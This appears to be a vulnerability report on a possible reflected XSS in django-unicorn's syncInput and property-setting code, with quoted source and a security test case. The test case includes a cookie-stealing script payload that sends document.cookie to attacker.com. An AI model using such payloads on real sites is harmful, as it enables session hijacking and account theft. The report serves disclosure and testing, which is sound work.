- Reflected Cross-Site Scripting (XSS) through Unsanitized Component Properties

- Description:
    1. A threat actor crafts a malicious URL or manipulates input fields to inject a JavaScript payload into a django-unicorn component property.
    2. The django-unicorn framework, specifically the `syncInput` action parser, receives the user input from the request payload and uses the `set_property_value` function to directly update the component's property with this unsanitized value.
    3. When the component template is rendered, the injected JavaScript payload within the component property is included in the HTML response without proper sanitization.
    4. When a user views the page with the component, the injected JavaScript payload is executed in their browser, potentially leading to session hijacking, cookie theft, or other malicious actions.

- Impact:
    - Account Takeover: Attackers can steal session cookies or credentials, gaining unauthorized access to user accounts.
    - Data Theft: Sensitive information displayed on the page can be exfiltrated by the malicious script.
    - Defacement: The attacker can modify the content of the web page seen by the victim.
    - Redirection to Malicious Sites: Users can be redirected to phishing websites or sites hosting malware.

- Vulnerability Rank: High

- Currently Implemented Mitigations:
    - HTML encoding is applied by default to updated field values to prevent XSS attacks, as mentioned in `docs\source\views.md` under "Meta" -> "safe". This mitigation is applied in the backend during template rendering and response generation.

- Missing Mitigations:
    - Input sanitization on the server-side: There is no explicit input sanitization for user-provided data before it's stored in component properties or rendered. The framework relies on Django's template engine auto-escaping for general template rendering, but this might be bypassed by developers using `safe` or custom template logic. The provided code confirms that user input is directly assigned to component properties without sanitization in `django_unicorn\views\action_parsers\sync_input.py` and `django_unicorn\views\utils.py`.
    - Contextual output encoding: While HTML encoding is the default, the documentation does not explicitly detail context-aware encoding strategies (e.g., JavaScript encoding for `<script>` tags). Developers need guidance on ensuring context-appropriate encoding to prevent XSS in different scenarios.

- Preconditions:
    - A django-unicorn component is used in a Django template and renders user-controlled data from component properties.
    - No explicit sanitization is implemented in the component's Python code for user inputs before assigning them to component properties.
    - The developer might unknowingly use the `safe` meta attribute or template filters incorrectly, bypassing the default HTML encoding when rendering user input.

- Source Code Analysis:
    1. `django_unicorn\views\action_parsers\sync_input.py`: The `handle` function processes `syncInput` actions. It extracts `property_name` and `property_value` from the request payload.

    ```python
    def handle(component_request: ComponentRequest, component: UnicornView, payload: Dict):
        property_name = payload.get("name")
        property_value = payload.get("value")
        ...
        set_property_value(
            component, property_name, property_value, component_request.data, call_resolved_method=call_resolved_method
        )
    ```
    2. `django_unicorn\views\action_parsers\utils.py`: The `set_property_value` function is called to update the component's property. It directly sets the `property_value` to the component's attribute without any sanitization.

    ```python
    @timed
    def set_property_value(
        component: UnicornView,
        property_name: Optional[str],
        property_value: Any,
        data: Optional[Dict] = None,
        call_resolved_method=True,  # noqa: FBT002
    ) -> None:
        ...
        if hasattr(component_or_field, "_set_property"):
            # Can assume that `component_or_field` is a component
            component_or_field._set_property(
                property_name_part,
                property_value,
                call_updating_method=False,  # the updating method has already been called above
                call_updated_method=True,
                call_resolved_method=call_resolved_method,
            )
        else:
            setattr(component_or_field, property_name_part, property_value)
        ...
    ```
    3. `django_unicorn\components\unicorn_view.py`: The `_set_property` method in `UnicornView` also directly assigns the value to the component's property. While it calls `cast_attribute_value` for type conversion, it does not perform any sanitization.

    ```python
    def _set_property(
        self,
        name: str,
        value: Any,
        *,
        call_updating_method: bool = False,
        call_updated_method: bool = False,
        call_resolved_method: bool = False,
    ) -> None:
        # Get the correct value type by using the form if it is available
        data = self._attributes()

        value = cast_attribute_value(self, name, value)
        data[name] = value
        ...
        try:
            setattr(self, name, value)
        ...
    ```

    **Visualization:**

    ```
    User Input (Malicious Script) --> HTTP Request (unicorn:model update) --> Django Unicorn Backend --> sync_input.py --> set_property_value() --> Component Property (Unsanitized) --> Template Rendering --> HTML Response (XSS Payload) --> User Browser (Script Execution)
    ```

- Security Test Case:
    1. Create a django-unicorn component that displays a property bound to a text input using `unicorn:model`. For example, a component with a `message` property and template like:

        ```html
        <div>
          <input type="text" unicorn:model="message" id="message-input">
          <div id="message-display">{{ message }}</div>
        </div>
        ```

        ```python
        # components/xss_test.py
        from django_unicorn.components import UnicornView

        class XssTestView(UnicornView):
            message = ""
        ```

    2. Create a Django view and template that includes this component.

        ```html
        {% load unicorn %}
        <html>
        <head>
            {% unicorn_scripts %}
        </head>
        <body>
            {% csrf_token %}
            {% unicorn 'xss-test' %}
        </body>
        </html>
        ```

    3. Access the page in a browser.
    4. In the input field with `unicorn:model="message"`, enter a JavaScript payload like `<script>alert("XSS Vulnerability");</script>`.
    5. Observe if an alert box appears when you type or blur from the input field. If the alert box appears, it confirms that the JavaScript payload was executed, indicating an XSS vulnerability.
    6. To further verify, try a more impactful payload like stealing cookies: `<script>window.location='http://attacker.com/cookie_steal?cookie='+document.cookie;</script>`. Set up a simple HTTP listener on `attacker.com` to capture the stolen cookies.

- Vulnerability Rank Justification:
    - High rank is assigned because XSS vulnerabilities can lead to significant security breaches, including account takeover and data theft. The ease of exploitation is also high as it only requires injecting a malicious script through user inputs, which is a common attack vector. Although django-unicorn provides default HTML encoding during template rendering, the risk remains high due to potential developer misconfigurations (using `safe` incorrectly) and the lack of explicit input sanitization in the data handling logic within `sync_input.py`, `set_property_value` and `_set_property` functions. The provided files confirm the absence of input sanitization at the property update level.
